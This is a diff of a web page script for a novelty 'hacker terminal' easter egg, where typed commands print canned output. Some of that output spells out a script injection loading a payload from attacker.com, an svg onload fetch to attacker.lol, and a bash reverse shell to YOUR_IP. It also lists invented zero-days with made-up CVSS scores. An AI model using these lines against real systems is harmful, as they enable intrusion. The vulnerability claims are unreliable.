-<span class="text-red-400 font-bold">[!] WARNING: This is not a drill</span>`,
-
-        hack: `[+] TARGET: targetcorp.com
-[*] Phase 1: Recon COMPLETE
-[*] Phase 2: Vulnerability Scan COMPLETE  
-[*] Phase 3: <span class="text-red-400 font-bold">EXPLOITATION</span>
-
-<span class="text-emerald-500">[+] SHELL ACQUIRED ✓</span>
-<span class="text-yellow-400">[*] Privilege Escalation: 80%...</span>
-
-<span class="text-red-500 font-black text-lg">[!] SYSTEM COMPROMISED</span>`,
-
-        exploit: `[+] Generating 0day Payload...
-<span class="text-purple-400">[*] Tailwind CSP Bypass + XSS → RCE</span>
-
-<span class="text-red-400 font-mono text-sm bg-black/50 p-3 rounded mt-2 block">
-&lt;script&gt;var s=document.createElement('script');s.src='//attacker.com/payload.js';document.head.append(s);&lt;/script&gt;
-</span>
-<span class="text-emerald-400">[+] Payload Size: 128 bytes | Detection: 0/42 AVs</span>`,
-
-        pwn: `[!] PWNING IN PROGRESS...
-<span class="text-red-400">[+] Dirty COW → Root Shell</span>
-<span class="text-emerald-500">[+] whoami: root ✓</span>
-<span class="text-yellow-400">[+] Persistence: cronjob installed</span>
-<span class="text-red-500 font-bold">[!] MACHINE PWNED ✓</span>`,
-
-        '0day': `[+] Zero-Day Arsenal Deployed
-1. TailwindCSS Prototype Pollution (CVSS 9.1)
-2. JetBrains Mono Font SSRF (CVSS 8.7) 
-3. Fira Code Deserialization RCE (CVSS 9.8)
-[+] <span class="text-red-400">All chains weaponized</span>`
+        nmap: `<span class="text-yellow-400">[+] Nmap Scan</span><br>22/ssh 80/http 443/https 3306/mysql<br><span class="text-emerald-400">[3] services vulnerable</span>`,
+        exploit: `<span class="text-red-400 font-bold">[+] XSS → RCE Payload Deployed</span><br><span class="text-gray-500 text-xs mono">&lt;svg onload=fetch('http://attacker.lol/shell')&gt;</span>`,
+        hack: `<span class="text-emerald-400 font-bold">[!] SYSTEM COMPROMISED ✓</span>`,
+        shell: `<span class="text-red-400 mono text-sm">bash -i >& /dev/tcp/YOUR_IP/4444 0>&1</span>`
       };
 
-      // Terminal Elements
-      const input = document.getElementById("terminal-input");
-      const content = document.getElementById("terminal-content");
-      const cursorBlink = document.getElementById("cursor-blink");
+      // Elements
+      const input = document.getElementById('terminal-input');
+      const output = document.getElementById('terminal-content');
+      const cursor = document.getElementById('cursor');
 
-      // Enhanced Cursor
-      const cursor = document.getElementById("cursor");
-      document.addEventListener("mousemove", (e) => {
-        cursor.style.left = e.clientX + "px";
-        cursor.style.top = e.clientY + "px";
+      // Mouse cursor
+      document.addEventListener('mousemove', e => {
+        cursor.style.left = e.clientX + 'px';
+        cursor.style.top = e.clientY + 'px';
       });
 
-      // Hover Effects
-      document.querySelectorAll('a, .bento-card, button').forEach(el => {
-        el.addEventListener('mouseenter', () => cursor.classList.add('hovered'));
-        el.addEventListener('mouseleave', () => cursor.classList.remove('hovered'));
+      // Hover states
+      document.querySelectorAll('a, button, .glass-card').forEach(el => {
+        el.addEventListener('mouseenter', () => cursor.classList.add('hover'));
+        el.addEventListener('mouseleave', () => cursor.classList.remove('hover'));
       });
 
-      // Terminal Input Handler
-      input.addEventListener("keydown", async (e) => {
-        if (e.key === "Enter") {
-          const cmd = input.value.toLowerCase().trim();
-          const escapedCmd = escapeHtml(input.value);
-
-          // Always show command
-          content.innerHTML += `<div class="terminal-output"><span class="text-blue-500 font-bold">λ</span> <span class="text-white">${escapedCmd}</span></div>`;
-
-          if (cmd === "clear") {
-            content.innerHTML = '<div class="text-gray-500 text-xs">[+] Screen cleared</div>';
-          } else if (cmd === "scan") {
-            content.innerHTML += `<div class="text-yellow-400 terminal-output">[*] Initializing packet trace...</div>`;
-            
-            try {
-              const controller = new AbortController();
-              const timeout = setTimeout(() => controller.abort(), 5000);
-              
-              const response = await fetch("https://api.ipify.org?format=json", { 
-                signal: controller.signal 
-              });
-              const data = await response.json();
-              clearTimeout(timeout);
-              
-              content.innerHTML += `<div class="text-emerald-500 font-bold terminal-output">[+] Target: <span class="text-white">${data.ip}</span></div>`;
-              content.innerHTML += `<div class="text-gray-500 text-xs terminal-output">[*] GeoIP: Remote | ASN: Cloud Provider | Risk: HIGH</div>`;
-            } catch (err) {
-              content.innerHTML += `<div class="text-red-400 terminal-output">[!] Firewall blocked trace. TOR recommended.</div>`;
-            }
-          } else if (cmd === "date") {
-            const res = typeof responses[cmd] === 'function' ? responses[cmd]() : responses[cmd];
-            content.innerHTML += `<div class="text-yellow-400 terminal-output">${res}</div>`;
-          } else {
-            const res = responses[cmd] || `<span class="text-red-400">[!] Unknown command: ${escapedCmd}</span>\n<span class="text-gray-500 text-xs">Try 'help' or 'redpill'</span>`;
-            content.innerHTML += `<div class="terminal-output text-gray-400">${res}</div>`;
-          }
-
-          input.value = "";
-          content.scrollTop = content.scrollHeight;
+      // Terminal handler
+      input.addEventListener('keydown', async e => {
+        if (e.key === 'Enter') {
+          const cmd = input.value.trim().toLowerCase();
+          const safeCmd = escapeHtml(input.value);
           
-          // Auto-scroll enhancement
-          content.scrollTo({
-            top: content.scrollHeight,
-            behavior: 'smooth'
-          });
+          if (!cmd) return;
+          
+          // Echo command
+          output.innerHTML += `<div class="type-effect"><span class="text-cyan-400 font-bold">λ</span> ${safeCmd}</div>`;
+          
+          // Execute
+          let result = commands[cmd] || `<span class="text-red-400">[!] Unknown: ${safeCmd}</span>`;
+          if (typeof result === 'function') result = await result();
+          
+          output.innerHTML += `<div class="type-effect text-gray-400">${result}</div>`;
+          
+          input.value = '';
+          output.scrollTop = output.scrollHeight;
         }
       });
 
-      // Focus cursor blink
-      input.addEventListener('focus', () => {
-        cursorBlink.classList.add('blink');
-      });
-      input.addEventListener('blur', () => {
-        cursorBlink.classList.remove('blink');
-      });
-
-      // Easter egg: Tab completion simulation
-      input.addEventListener('keydown', (e) => {
-        if (e.key === 'Tab') {
-          e.preventDefault();
-          const val = input.value.toLowerCase().trim();
-          const matches = Object.keys(responses).filter(cmd => cmd.startsWith(val));
-          if (matches.length === 1) {
-            input.value = matches[0];
-          }
-        }
-      });
-
-      // Initial boot sequence
-      setTimeout(() => {
-        content.innerHTML += `<div class="text-emerald-500 text-xs">[+] Boot sequence complete. Awaiting commands...</div>`;
-        content.scrollTop = content.scrollHeight;
-      }, 1000);
+      // Mobile cursor hide
+      if (window.innerWidth < 768) {
+        document.body.style.cursor = 'auto';
+        cursor.style.display = 'none';
+      }
     </script>
   </body>
-</html>
+          </html>
